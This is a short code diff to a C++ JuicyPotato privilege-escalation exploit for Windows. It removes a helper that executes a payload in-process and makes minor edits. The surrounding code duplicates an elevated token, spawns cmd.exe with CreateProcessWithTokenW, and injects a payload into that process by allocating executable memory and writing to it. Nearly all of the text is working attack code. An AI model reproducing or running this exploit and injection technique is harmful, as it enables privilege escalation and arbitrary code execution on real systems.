@@ -8,13 +8,6 @@ EXTERN_C IMAGE_DOS_HEADER __ImageBase;
 HANDLE ElevatedToken, DupedToken;
 wchar_t* cmdproc;
 
-VOID ExecutePayload(LPVOID lpPayload)
-{
-	printf("[+] Executing payload\n");
-	VOID(*lpCode)() = (VOID(*)())lpPayload;
-	lpCode();
-}
-
 int JuicyPotato(LPVOID lpPayload)
 {
 	PotatoAPI* test = new PotatoAPI();
@@ -75,8 +68,8 @@ int JuicyPotato(LPVOID lpPayload)
 			si.lpDesktop = L"winsta0\\default";
 
 			DWORD sessionId = WTSGetActiveConsoleSessionId();
-			cmdproc = L"cmd.exe";
-			//ret = CreateProcessWithTokenW(DupedToken,0,cmdproc,NULL,0,NULL,NULL,&si,&pi);
+			cmdproc = L"cmd.exe"; 
+
 			ret = CreateProcessWithTokenW(DupedToken, 0, cmdproc, NULL, 0, NULL, NULL, &si, &pi);
 			if (!ret) 
 			{
@@ -106,7 +99,6 @@ int JuicyPotato(LPVOID lpPayload)
 			{
 				printf("\n[+] CreateProcessWithTokenW OK\n");
 
-				
 				LPVOID vptr = (int*)VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 				SIZE_T lpnumber = 0;
 				BOOL b = WriteProcessMemory(pi.hProcess, vptr, lpPayload, 4096, &lpnumber);
